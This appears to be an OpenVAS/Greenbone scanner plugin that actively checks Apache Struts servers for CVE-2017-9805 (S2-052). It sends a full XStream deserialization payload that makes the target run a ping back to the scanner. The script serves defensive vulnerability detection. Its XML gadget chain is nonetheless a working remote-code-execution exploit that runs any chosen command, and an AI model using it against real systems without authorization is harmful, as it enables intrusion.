# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:apache:struts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.811730");
  script_version("2024-11-13T05:05:39+0000");
  script_cve_id("CVE-2017-9805");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-11-13 05:05:39 +0000 (Wed, 13 Nov 2024)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-07-25 13:40:54 +0000 (Thu, 25 Jul 2024)");
  script_tag(name:"creation_date", value:"2017-09-07 16:39:09 +0530 (Thu, 07 Sep 2017)");
  script_name("Apache Struts Security Update (S2-052) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_dependencies("gb_apache_struts_consolidation.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("apache/struts/http/detected");

  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-052");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/100609");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"Advisory-ID", value:"S2-052");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  script_tag(name:"summary", value:"Apache Struts is prone to a remote code execution
  (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks if the target is
  connecting back to the scanner host.

  Note: For a successful detection of this flaw the scanner host needs to be able to directly
  receive ICMP echo requests from the target.");

  script_tag(name:"insight", value:"The flaw exists within the REST plugin which is using a
  XStreamHandler with an instance of XStream for deserialization without any type
  filtering.");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow an attacker to
  execute arbitrary code in the context of the affected application. Failed exploit attempts will
  likely result in denial of service (DoS) conditions.");

  script_tag(name:"affected", value:"Apache Struts 2.1.2 through 2.3.33 and 2.5 through
  2.5.12.");

  script_tag(name:"solution", value:"Update to version 2.3.34, 2.5.13 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("misc_func.inc");
include("host_details.inc");
include("os_func.inc");
include("list_array_func.inc");
include("pcap_func.inc");
include("dump.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

ownhostname = this_host_name();
ownip = this_host();
src_filter = pcap_src_ip_filter_from_hostnames();
dst_filter = string("(dst host ", ownip, " or dst host ", ownhostname, ")");
filter = string("icmp and icmp[0] = 8 and ", src_filter, " and ", dst_filter);

# nb:
# - Might be placed in different locations...
# - This is only basic check for the vulnerable known rest showcase endpoint
urls = make_list(
  dir + "/orders/3",
  dir + "/struts2-rest-showcase/orders/3",
  "/orders/3"
);

headers = make_array("Content-Type", "application/xml");

if(os_host_runs("Windows") == "yes")
  target_runs_windows = TRUE;

foreach connect_back_target(make_list(ownip, ownhostname)) {

  foreach url(urls) {

    if(target_runs_windows) {
      COMMAND = "<string>ping</string><string>-n</string><string>3</string><string>" + connect_back_target + "</string>";
    } else {
      vtstrings = get_vt_strings();
      check = vtstrings["ping_string"];
      pattern = hexstr(check);
      COMMAND = "<string>ping</string><string>-c</string><string>3</string><string>-p</string><string>" + pattern + "</string><string>" + connect_back_target + "</string>";
    }

    data =
'       <map>
        <entry>
        <jdk.nashorn.internal.objects.NativeString>
        <flags>0</flags>
        <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
        <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
        <is class="javax.crypto.CipherInputStream">
        <cipher class="javax.crypto.NullCipher">
        <initialized>false</initialized>
        <opmode>0</opmode>
        <serviceIterator class="javax.imageio.spi.FilterIterator">
        <iter class="javax.imageio.spi.FilterIterator">
        <iter class="java.util.Collections$EmptyIterator"/>
        <next class="java.lang.ProcessBuilder">
        <command>
        ' + COMMAND + '
        </command>
        <redirectErrorStream>false</redirectErrorStream>
        </next>
        </iter>
        <filter class="javax.imageio.ImageIO$ContainsFilter">
        <method>
        <class>java.lang.ProcessBuilder</class>
        <name>start</name>
        <parameter-types/>
        </method>
        <name>foo</name>
        </filter>
        <next class="string">foo</next>
        </serviceIterator>
        <lock/>
        </cipher>
        <input class="java.lang.ProcessBuilder$NullInputStream"/>
        <ibuffer/>
        <done>false</done>
        <ostart>0</ostart>
        <ofinish>0</ofinish>
        <closed>false</closed>
        </is>
        <consumed>false</consumed>
        </dataSource>
        <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
        </value>
        </jdk.nashorn.internal.objects.NativeString>
        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
        </entry>
        <entry>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
        </entry>
        </map>';
    len = strlen(data);

    req = http_post_put_req(port:port, url:url, data:data, add_headers:headers);

    # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple hostnames /
    # vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(), ...). Reason: If
    # the fork would be done after calling open_sock_tcp() the child's would share the same socket
    # causing race conditions and similar.
    if(!soc = open_sock_tcp(port))
      continue;

    res = send_capture(socket:soc, data:req, timeout:5, pcap_filter:filter);

    close(soc);

    if(!res)
      continue;

    type = get_icmp_element(icmp:res, element:"icmp_type");
    if(!type || type != 8)
      continue;

    # nb: If understanding https://datatracker.ietf.org/doc/html/rfc792 correctly the "data" field
    # should be always there. In addition at least standard Linux and Windows systems are always
    # sending data so it should be safe to check this here.
    if(!data = get_icmp_element(icmp:res, element:"data"))
      continue;

    if((target_runs_windows || check >< data)) {
      report = "It was possible to execute code remotely at " + http_report_vuln_url(port:port, url:url, url_only:TRUE) + " with the command '" + COMMAND + "'.";
      report += '\n\nReceived answer (ICMP "Data" field):\n\n' + hexdump(ddata:data);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host or another IP is responding from our request.
exit(0);
